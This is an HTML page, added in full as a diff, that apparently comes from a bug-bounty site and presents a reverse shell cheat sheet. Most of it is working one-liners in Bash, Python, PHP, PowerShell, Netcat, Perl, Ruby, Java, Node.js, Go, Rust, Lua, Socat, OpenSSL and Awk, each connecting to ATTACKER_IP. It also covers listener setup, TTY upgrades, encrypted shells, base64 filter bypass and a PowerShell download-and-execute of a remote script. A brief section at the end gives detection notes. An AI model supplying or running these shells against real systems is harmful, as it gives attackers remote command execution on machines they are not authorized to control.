@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Copy-paste reverse shell one-liners for 15 languages and tools. Bash, Python, PHP, PowerShell, Netcat, Perl, Ruby, Java, Node.js, Go, Rust, Lua, Socat, OpenSSL, and Awk — with listener setup, encrypted shells, and detection notes.">
+    <title>Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/reverse-shell-cheat-sheet-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/reverse-shell-cheat-sheet-2026/">
+    <meta property="og:title" content="Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages">
+    <meta property="og:description" content="Copy-paste reverse shell one-liners for 15 languages and tools. Bash, Python, PHP, PowerShell, Netcat, Perl, Ruby, Java, Node.js, Go, Rust, Lua, Socat, OpenSSL, and Awk — with listener setup, encrypted shells, and detection notes.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/reverse-shell-cheat-sheet-2026/">
+    <meta name="twitter:title" content="Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages">
+    <meta name="twitter:description" content="Copy-paste reverse shell one-liners for 15 languages and tools. Bash, Python, PHP, PowerShell, Netcat, Perl, Ruby, Java, Node.js, Go, Rust, Lua, Socat, OpenSSL, and Awk — with listener setup, encrypted shells, and detection notes.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages",
+      "description": "Copy-paste reverse shell one-liners for 15 languages and tools. Bash, Python, PHP, PowerShell, Netcat, Perl, Ruby, Java, Node.js, Go, Rust, Lua, Socat, OpenSSL, and Awk — with listener setup, encrypted shells, and detection notes.",
+      "url": "https://bughuntertools.com/articles/reverse-shell-cheat-sheet-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        <!-- Schema.org Structured Data for AI Agents -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages",
+      "description": "Copy-paste reverse shell one-liners for 15 languages and tools. Bash, Python, PHP, PowerShell, Netcat, Perl, Ruby, Java, Node.js, Go, Rust, Lua, Socat, OpenSSL, and Awk.",
+      "author": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools",
+        "url": "https://bughuntertools.com"
+      },
+      "datePublished": "2026-04-16",
+      "dateModified": "2026-04-16",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://bughuntertools.com/articles/reverse-shell-cheat-sheet-2026/"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://bughuntertools.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Articles",
+          "item": "https://bughuntertools.com/articles/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Reverse Shell Cheat Sheet 2026"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "What is a reverse shell?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "A reverse shell is a connection where the target machine initiates an outbound connection back to the attacker's listener, giving the attacker an interactive command shell. Unlike a bind shell (where the target listens for incoming connections), reverse shells bypass most firewall rules because outbound connections are typically allowed."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do I set up a listener for a reverse shell?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The simplest listener uses Netcat: nc -lvnp 4444. For a more stable listener with job control, use rlwrap nc -lvnp 4444. For encrypted connections, use ncat --ssl -lvnp 4444 or socat with OPENSSL."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do I upgrade a basic reverse shell to a fully interactive TTY?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "After catching a shell: 1) Run python3 -c 'import pty;pty.spawn(\"/bin/bash\")' on the target, 2) Press Ctrl+Z to background the shell, 3) Run stty raw -echo; fg on your machine, 4) Type reset and press Enter. You now have tab completion, arrow keys, and Ctrl+C works correctly."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Which reverse shell one-liner is most reliable?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The Bash /dev/tcp reverse shell (bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1) is the most reliable on Linux targets because Bash is almost always available. For Windows, PowerShell reverse shells are the most reliable. Python is the best cross-platform option."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can reverse shells be encrypted?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Yes. Use OpenSSL, Socat with OPENSSL, or Ncat with --ssl to encrypt reverse shell traffic. This prevents network monitoring tools from inspecting the shell session content, though the connection metadata is still visible."
+          }
+        }
+      ]
+    }
+  ]
+}
+</script>
+<article>
+  <header>
+    <h1>Reverse Shell Cheat Sheet 2026: One-Liners for Bash, Python, PowerShell, and 12 More Languages</h1>
+    <p class="article-meta">Published April 16, 2026 · Bug Hunter Tools</p>
+  </header>
+
+  <p>Every penetration tester and bug bounty hunter needs reverse shells. You find an RCE, you need a shell — fast. This cheat sheet gives you copy-paste one-liners for 15 languages and tools, plus listener setup, shell upgrades, and encrypted shell techniques.</p>
+
+  <p>Replace <code>ATTACKER_IP</code> with your IP and <code>PORT</code> with your listener port (commonly 4444 or 9001) in every command below.</p>
+
+  <nav>
+    <h2>Quick Navigation</h2>
+    <ul>
+      <li><a href="#listeners">Listener Setup</a></li>
+      <li><a href="#bash">Bash</a></li>
+      <li><a href="#python">Python</a></li>
+      <li><a href="#php">PHP</a></li>
+      <li><a href="#powershell">PowerShell</a></li>
+      <li><a href="#netcat">Netcat</a></li>
+      <li><a href="#perl">Perl</a></li>
+      <li><a href="#ruby">Ruby</a></li>
+      <li><a href="#java">Java</a></li>
+      <li><a href="#nodejs">Node.js</a></li>
+      <li><a href="#go">Go</a></li>
+      <li><a href="#rust">Rust</a></li>
+      <li><a href="#lua">Lua</a></li>
+      <li><a href="#socat">Socat</a></li>
+      <li><a href="#openssl">OpenSSL (Encrypted)</a></li>
+      <li><a href="#awk">Awk</a></li>
+      <li><a href="#upgrade">Shell Upgrade to Full TTY</a></li>
+      <li><a href="#encrypted">Encrypted Reverse Shells</a></li>
+      <li><a href="#detection">Detection and Logging Notes</a></li>
+    </ul>
+  </nav>
+
+  <h2 id="listeners">Listener Setup</h2>
+
+  <p>Before sending any reverse shell, start a listener on your attack machine.</p>
+
+  <h3>Basic Netcat Listener</h3>
+  <pre><code>nc -lvnp 4444</code></pre>
+
+  <h3>Netcat with Readline (arrow keys, history)</h3>
+  <pre><code>rlwrap nc -lvnp 4444</code></pre>
+
+  <h3>Socat Listener (full TTY from the start)</h3>
+  <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
+
+  <h3>Ncat with SSL (encrypted listener)</h3>
+  <pre><code>ncat --ssl -lvnp 4444</code></pre>
+
+  <h2 id="bash">Bash</h2>
+
+  <p>Works on most Linux systems. Bash's <code>/dev/tcp</code> is a built-in feature — no external tools needed.</p>
+
+  <h3>Bash TCP</h3>
+  <pre><code>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</code></pre>
+
+  <h3>Bash UDP</h3>
+  <pre><code>bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1</code></pre>
+
+  <h3>Bash with exec (alternative)</h3>
+  <pre><code>exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done</code></pre>
+
+  <h3>Bash base64-encoded (bypass filters)</h3>
+  <pre><code>echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | base64
+# Then on target:
+echo ENCODED_STRING | base64 -d | bash</code></pre>
+
+  <h2 id="python">Python</h2>
+
+  <p>Python is installed on most Linux servers and many Windows machines. The most versatile cross-platform option.</p>
+
+  <h3>Python 3</h3>
+  <pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+
+  <h3>Python 2</h3>
+  <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+
+  <h3>Python (Windows)</h3>
+  <pre><code>python -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['cmd.exe'])"</code></pre>
+
+  <h2 id="php">PHP</h2>
+
+  <p>Common on web servers. Multiple methods depending on which PHP functions are available (some may be disabled in <code>php.ini</code>).</p>
+
+  <h3>PHP exec</h3>
+  <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+
+  <h3>PHP proc_open</h3>
+  <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'</code></pre>
+
+  <h3>PHP system (web shell to reverse shell)</h3>
+  <pre><code>&lt;?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?&gt;</code></pre>
+
+  <h2 id="powershell">PowerShell</h2>
+
+  <p>The go-to for Windows targets. PowerShell reverse shells are often the most reliable on modern Windows.</p>
+
+  <h3>PowerShell one-liner</h3>
+  <pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+
+  <h3>PowerShell base64-encoded</h3>
+  <pre><code># Generate on Linux:
+echo -n 'IEX(IWR http://ATTACKER_IP/shell.ps1 -UseBasicParsing)' | iconv -t UTF-16LE | base64 -w 0
+# Execute on target:
+powershell -nop -enc ENCODED_STRING</code></pre>
+
+  <h2 id="netcat">Netcat</h2>
+
+  <p>Classic tool. Different versions have different flags — <code>-e</code> is not available in all builds.</p>
+
+  <h3>Netcat with -e (traditional)</h3>
+  <pre><code>nc -e /bin/sh ATTACKER_IP PORT</code></pre>
+
+  <h3>Netcat without -e (FIFO pipe method)</h3>
+  <pre><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f</code></pre>
+
+  <h3>Ncat (Nmap's netcat — supports SSL)</h3>
+  <pre><code>ncat --ssl ATTACKER_IP PORT -e /bin/sh</code></pre>
+
+  <h2 id="perl">Perl</h2>
+
+  <h3>Perl</h3>
+  <pre><code>perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>
+
+  <h3>Perl (no /bin/sh)</h3>
+  <pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</code></pre>
+
+  <h2 id="ruby">Ruby</h2>
+
+  <h3>Ruby</h3>
+  <pre><code>ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></pre>
+
+  <h3>Ruby (Windows)</h3>
+  <pre><code>ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP",PORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</code></pre>
+
+  <h2 id="java">Java</h2>
+
+  <h3>Java Runtime exec</h3>
+  <pre><code>Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done");
+p.waitFor();</code></pre>
+
+  <h3>Java one-liner (for injection points)</h3>
+  <pre><code>java -cp . RevShell  // Compile: javac RevShell.java
+// RevShell.java:
+// import java.io.*;import java.net.*;
+// public class RevShell{public static void main(String[] a)throws Exception{
+// Socket s=new Socket("ATTACKER_IP",PORT);
+// Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
+// InputStream pi=p.getInputStream(),si=s.getInputStream();
+// OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+// while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
+// while(si.available()>0)po.write(si.read());so.flush();po.flush();
+// Thread.sleep(50);if(p.exitValue()!=0)break;}}}</code></pre>
+
+  <h2 id="nodejs">Node.js</h2>
+
+  <h3>Node.js</h3>
+  <pre><code>node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})()'</code></pre>
+
+  <h3>Node.js (require blocked — use global)</h3>
+  <pre><code>require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')</code></pre>
+
+  <h2 id="go">Go</h2>
+
+  <h3>Go (compile and transfer)</h3>
+  <pre><code>// revshell.go — cross-compile: GOOS=linux GOARCH=amd64 go build -o revshell revshell.go
+package main
+import("net";"os/exec")
+func main(){
+  c,_:=net.Dial("tcp","ATTACKER_IP:PORT")
+  cmd:=exec.Command("/bin/sh")
+  cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c
+  cmd.Run()
+}</code></pre>
+
+  <h2 id="rust">Rust</h2>
+
+  <h3>Rust (compile and transfer)</h3>
+  <pre><code>// Cross-compile: cargo build --release --target x86_64-unknown-linux-musl
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+fn main(){
+    let s=TcpStream::connect("ATTACKER_IP:PORT").unwrap();
+    let fd=s.as_raw_fd();
+    Command::new("/bin/sh").arg("-i")
+        .stdin(unsafe{Stdio::from_raw_fd(fd)})
+        .stdout(unsafe{Stdio::from_raw_fd(fd)})
+        .stderr(unsafe{Stdio::from_raw_fd(fd)})
+        .spawn().unwrap().wait().unwrap();
+}</code></pre>
+
+  <h2 id="lua">Lua</h2>
+
+  <h3>Lua (requires luasocket)</h3>
+  <pre><code>lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"</code></pre>
+
+  <h2 id="socat">Socat</h2>
+
+  <p>Socat gives you a fully interactive TTY reverse shell — no upgrade needed.</p>
+
+  <h3>Socat reverse shell (full TTY)</h3>
+  <pre><code># Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444</code></pre>
+
+  <h3>Socat encrypted (OpenSSL)</h3>
+  <pre><code># Generate cert: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
+# Combine: cat shell.key shell.crt > shell.pem
+
+# Listener:
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+
+# Target:
+socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/sh,pty,stderr,setsid</code></pre>
+
+  <h2 id="openssl">OpenSSL (Encrypted Shell)</h2>
+
+  <p>When you need encryption but only have OpenSSL on the target (no socat, no ncat).</p>
+
+  <h3>OpenSSL reverse shell</h3>
+  <pre><code># Generate cert on attacker:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj '/CN=localhost'
+
+# Listener:
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+
+# Target:
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s</code></pre>
+
+  <h2 id="awk">Awk</h2>
+
+  <h3>Awk (GNU awk with networking)</h3>
+  <pre><code>awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</code></pre>
+
+  <h2 id="upgrade">Shell Upgrade to Full TTY</h2>
+
+  <p>Basic reverse shells lack tab completion, arrow keys, and job control. Here's how to upgrade.</p>
+
+  <h3>Python PTY upgrade (most common)</h3>
+  <pre><code># On the target (inside your reverse shell):
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Press Ctrl+Z to background the shell
+
+# On your machine:
+stty raw -echo; fg
+
+# Press Enter, then type:
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 38 columns 116</code></pre>
+
+  <h3>Script upgrade (if no Python)</h3>
+  <pre><code>script -qc /bin/bash /dev/null
+# Then Ctrl+Z, stty raw -echo; fg, reset</code></pre>
+
+  <h3>Socat upgrade (if socat is on target)</h3>
+  <pre><code># On attacker — start socat listener:
+socat file:`tty`,raw,echo=0 tcp-listen:5555
+
+# On target — connect back with full TTY:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:5555</code></pre>
+
+  <h2 id="encrypted">Encrypted Reverse Shells</h2>
+
+  <p>Unencrypted reverse shells are visible to any network monitoring tool. In real engagements, encrypt your shells.</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Method</th>
+        <th>Requires on Target</th>
+        <th>Full TTY</th>
+        <th>Setup Complexity</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Ncat --ssl</td>
+        <td>ncat</td>
+        <td>No (needs upgrade)</td>
+        <td>Low</td>
+      </tr>
+      <tr>
+        <td>Socat OPENSSL</td>
+        <td>socat</td>
+        <td>Yes</td>
+        <td>Medium (cert gen)</td>
+      </tr>
+      <tr>
+        <td>OpenSSL s_client</td>
+        <td>openssl</td>
+        <td>No (needs upgrade)</td>
+        <td>Medium (cert gen)</td>
+      </tr>
+      <tr>
+        <td>SSH reverse tunnel</td>
+        <td>ssh client</td>
+        <td>Yes</td>
+        <td>Low</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>SSH reverse tunnel (if SSH client is available)</h3>
+  <pre><code># On attacker — allow remote port forwarding:
+# In /etc/ssh/sshd_config: GatewayPorts yes
+# Start SSH server
+
+# On target:
+ssh -R 4444:localhost:22 attacker@ATTACKER_IP -N -f
+# Now SSH to localhost:4444 on attacker machine to reach target</code></pre>
+
+  <h2 id="detection">Detection and Logging Notes</h2>
+
+  <p>If you're on a blue team or writing detection rules, here's what to look for:</p>
+
+  <ul>
+    <li><strong>Bash /dev/tcp</strong>: Monitor for processes accessing <code>/dev/tcp</code> — this is a Bash built-in, not a real file. Auditd rule: <code>-w /dev/tcp -p rwxa</code> won't work; instead monitor bash process arguments.</li>
+    <li><strong>Named pipes</strong>: <code>mkfifo</code> in <code>/tmp</code> is a strong indicator. Monitor with: <code>auditctl -w /tmp -p c -k named_pipe</code></li>
+    <li><strong>Python pty.spawn</strong>: Process tree showing <code>python → bash</code> is a classic shell upgrade indicator.</li>
+    <li><strong>PowerShell</strong>: Look for <code>System.Net.Sockets.TCPClient</code> in script block logging (Event ID 4104).</li>
+    <li><strong>Outbound connections</strong>: Any process spawning <code>/bin/sh</code> with network file descriptors is suspicious. Monitor with <code>ss -tnp</code> or <code>lsof -i</code>.</li>
+    <li><strong>Encrypted shells</strong>: TLS connections from non-browser processes to non-standard ports. JA3/JA3S fingerprinting can identify socat/openssl client signatures.</li>
+  </ul>
+
+  <h2>Related Resources</h2>
+  <ul>
+    <li><a href="/articles/bug-bounty-starter-kit/">Bug Bounty Starter Kit</a> — everything you need to find your first vulnerability</li>
+    <li><a href="/articles/bug-bounty-recon-workflow-2026/">Bug Bounty Recon Workflow</a> — from scope to first finding</li>
+    <li><a href="/articles/ssrf-server-side-request-forgery-what-scanners-should-detect-2026/">SSRF Testing Guide</a> — what your scanner should detect</li>
+    <li><a href="/articles/web-app-security-testing-checklist-2026/">Web App Security Testing Checklist</a></li>
+  </ul>
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
